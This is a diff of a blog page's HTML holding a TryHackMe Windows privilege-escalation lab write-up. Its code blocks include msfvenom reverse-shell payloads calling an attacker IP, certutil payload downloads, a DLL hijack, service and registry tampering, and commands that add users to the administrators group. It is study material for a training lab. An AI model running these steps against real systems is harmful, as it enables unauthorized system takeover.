@@ -115,11 +115,40 @@
     <div class="search-dropdown mobile">
         <div id="search-dropdown-mobile"></div>
     </div><main class="main">
-                <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows-PrivEsc-Arena TryHackMe writeup</h1><div class="post-meta">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows-PrivEsc-Arena TryHackMe writeup</h1><div class="post-meta">
             <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/windows-machines/">Windows Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-26">2022-04-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1611 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
-        </div><div class="content" id="content"><p>During studying the <a href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" target="_blank" rel="noopener noreffer ">TCM windows privilege escalation course</a> this is the <a href="https://tryhackme.com/room/windowsprivescarena" target="_blank" rel="noopener noreffer ">Lab</a> designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist</p>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#service-escalation---unquoted-service-paths">Service-Escalation - Unquoted Service Paths</a></li>
+    <li><a href="#service-escalation---dll-hijacking">Service Escalation - DLL Hijacking</a></li>
+    <li><a href="#service-escalation---registry">Service Escalation - Registry</a></li>
+    <li><a href="#service-escalation---executable-files">Service Escalation - Executable Files</a></li>
+    <li><a href="#service-escalation---binpath">Service Escalation - binPath</a></li>
+    <li><a href="#potato-escalation---hot-potato">Potato Escalation - Hot Potato</a></li>
+    <li><a href="#registry-escalation---autorun">Registry Escalation - Autorun</a></li>
+    <li><a href="#registry-escalation---alwaysinstallelevated">Registry Escalation - AlwaysInstallElevated</a></li>
+    <li><a href="#privilege-escalation---startup-applications">Privilege Escalation - Startup Applications</a></li>
+    <li><a href="#password-mining-escalation---memory">Password Mining Escalation - Memory</a></li>
+    <li><a href="#privilege-escalation---kernel-exploits">Privilege Escalation - Kernel Exploits</a></li>
+    <li><a href="#automation">Automation</a></li>
+    <li><a href="#quick-commands">Quick commands</a>
+      <ul>
+        <li><a href="#useful-resources-">Useful Resources :</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>During studying the <a href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" target="_blank" rel="noopener noreffer ">TCM windows privilege escalation course</a> this is the <a href="https://tryhackme.com/room/windowsprivescarena" target="_blank" rel="noopener noreffer ">Lab</a> designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist</p>
 <p>this room covers :</p>
 <ul>
 <li><a href="#service-escalation---unquoted-service-paths" rel="">Service Escalation - Unquoted Service Paths</a></li>
@@ -151,7 +180,7 @@
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">rdesktop</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">235</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">password321</span></span></span></code></pre></div></div>
 <h2 id="service-escalation---unquoted-service-paths">Service-Escalation - Unquoted Service Paths</h2>
 <ul>
@@ -161,7 +190,7 @@
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">example</span> <span class="mf">2</span><span class="p">\</span><span class="n">app</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
 <ul>
 <li>what happens to run the app.exe is as following:</li>
@@ -170,7 +199,7 @@
     <div class="code-header language-">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><pre tabindex="0"><code># Try :
 C:\Program.exe
 # if not found try :
@@ -187,7 +216,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-WmiObject</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">PathName</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -204,7 +233,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">qc</span> <span class="n">unqoutedsvc</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -234,7 +263,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.0.37 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -o  common.exe</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -259,7 +288,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s1">&#39;net localgroup administrators user /add&#39;</span> <span class="o">-f</span> <span class="nb">exe-service</span> <span class="n">-o</span> <span class="n">common</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -331,7 +360,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#include &lt;windows.h&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="p">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
@@ -347,7 +376,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">x86_64-w64</span><span class="n">-mingw32-gcc</span>  <span class="n">dll</span><span class="p">.</span><span class="py">c</span> <span class="n">-shared</span> <span class="n">-o</span> <span class="n">hijackme</span><span class="p">.</span><span class="n">dll</span></span></span></code></pre></div></div>
 <ul>
 <li>move it and restart the service :</li>
@@ -371,7 +400,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query HKLM\SYSTEM\CurrentControlSet\Services</span></span></code></pre></div></div>
 <ul>
 <li>search for a service has <code>NT AUTHORITY\INTERACTIVE allow FullControl</code> :</li>
@@ -380,7 +409,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc <span class="p">|</span> fl</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -398,7 +427,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">cmd.exe /k net localgroup administrators user /add</span></span></code></pre></div></div>
 <ul>
 <li>cross compile it :</li>
@@ -407,7 +436,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">i686-w64</span><span class="n">-mingw32-gcc</span> <span class="n">windows_service</span><span class="p">.</span><span class="py">c</span> <span class="n">-o</span> <span class="n">fake</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
 <ul>
 <li>send it to the windows then :</li>
@@ -416,7 +445,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">services</span><span class="p">\</span><span class="n">regsvc</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">c:</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">fake</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">f</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -446,14 +475,14 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">Status</span> <span class="o">-eq</span> <span class="s2">&#34;Running&#34;</span><span class="p">}</span></span></span></code></pre></div></div>
 <p>or cmd :</p>
 <div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">query</span> <span class="n">type</span><span class="p">=</span><span class="n">service</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -501,7 +530,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="p">.\</span><span class="n">accesschk64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-wuvc</span> <span class="n">Everyone</span> <span class="p">*</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -519,7 +548,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="n">daclsvc</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;net localgroup administrators user /add&#34;</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -547,7 +576,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic qfe list full /format:table</span></span></code></pre></div></div>
 <ul>
 <li>searching for the 3 installs , will find none of them patching the vuln</li>
@@ -557,7 +586,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">tater</span><span class="p">.</span><span class="py">ps1</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-Tater</span> <span class="n">-Trigger</span> <span class="mf">1</span> <span class="n">-Command</span> <span class="s2">&#34;net localgroup administrators user /add&#34;</span></span></span></code></pre></div></div>
 <p><img
@@ -601,7 +630,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="mf">10.9</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">37</span> <span class="n">LPORT</span><span class="p">=</span><span class="mf">9090</span> <span class="o">-f</span> <span class="n">exe</span> <span class="n">-o</span>  <span class="n">program</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
 <ul>
 <li>fire up your http server then from the windows machine download it :</li>
@@ -610,7 +639,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">certutil -urlcache -f http://10.9.0.37:8888/program.exe program.exe</span></span></code></pre></div></div>
 <ul>
 <li>rename it to <code>program.exe</code> as the auto runner program , copy &amp; overwrite it :</li>
@@ -630,7 +659,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler;set LHOST 10.9.0.37;set LPORT 9090;set payload windows/meterpreter/reverse_tcp;run&#34;</span></span></span></code></pre></div></div>
 <ul>
 <li>login with admin account :</li>
@@ -639,7 +668,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">rdesktop</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">174</span><span class="p">.</span><span class="py">128</span>  <span class="n">-u</span> <span class="n">TCM</span> <span class="n">-p</span> <span class="n">Hacker12</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -663,7 +692,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
 </span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span></span></span></code></pre></div></div>
 <p><img
@@ -679,7 +708,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="mf">10.9</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">37</span> <span class="n">LPORT</span><span class="p">=</span><span class="mf">7878</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">setup</span><span class="p">.</span><span class="n">msi</span></span></span></code></pre></div></div>
 <p>move it to the machine and run it :</p>
 <p><img
@@ -706,7 +735,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">icacls</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -745,7 +774,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfconsole</span> <span class="n">-x</span> <span class="s2">&#34;use auxiliary/server/capture/http_basic;set uripath x ; run&#34;</span></span></span></code></pre></div></div>
 <ul>
 <li>This module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console</li>
@@ -780,7 +809,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-powershell">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">python</span> <span class="nb">windows-exploit</span><span class="n">-suggester</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-database</span> <span class="mf">2022</span><span class="p">-</span><span class="mf">04</span><span class="p">-</span><span class="mf">25</span><span class="n">-mssb</span><span class="p">.</span><span class="py">xls</span> <span class="p">-</span><span class="n">-systeminfo</span> <span class="p">~/</span><span class="n">CTFs</span><span class="p">/</span><span class="n">Tryhackme</span><span class="p">/</span><span class="n">windowsprivescarena</span><span class="p">/</span><span class="n">kernel_search</span></span></span></code></pre></div></div>
 <ul>
 <li>but the easiest way is to get a meterpreter shell and use the run <code>local_exploit_suggester</code></li>
@@ -828,7 +857,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-cmd">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">certutil -urlcache -f <span class="p">&lt;</span>url<span class="p">&gt;</span> &lt;outfile_name&gt;
 </span></span><span class="line"><span class="cl">Invoke-WebRequest -Uri <span class="p">&lt;</span>url<span class="p">&gt;</span> -OutFile <span class="p">&lt;</span>outfile_name&gt;</span></span></code></pre></div></div>
 <ul>
@@ -839,7 +868,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># exe payload to get reverse shell</span>
 </span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.0.37 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -o  common.exe
 </span></span><span class="line"><span class="cl"><span class="c1"># exe payload to execute commands</span>
@@ -853,7 +882,7 @@ C:\Program Files\example 2\app.exe</code></pre></div>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler;set LHOST &lt;ip&gt;;set LPORT &lt;port&gt;;set payload windows/meterpreter/reverse_tcp;run&#34;</span></span></span></code></pre></div></div>
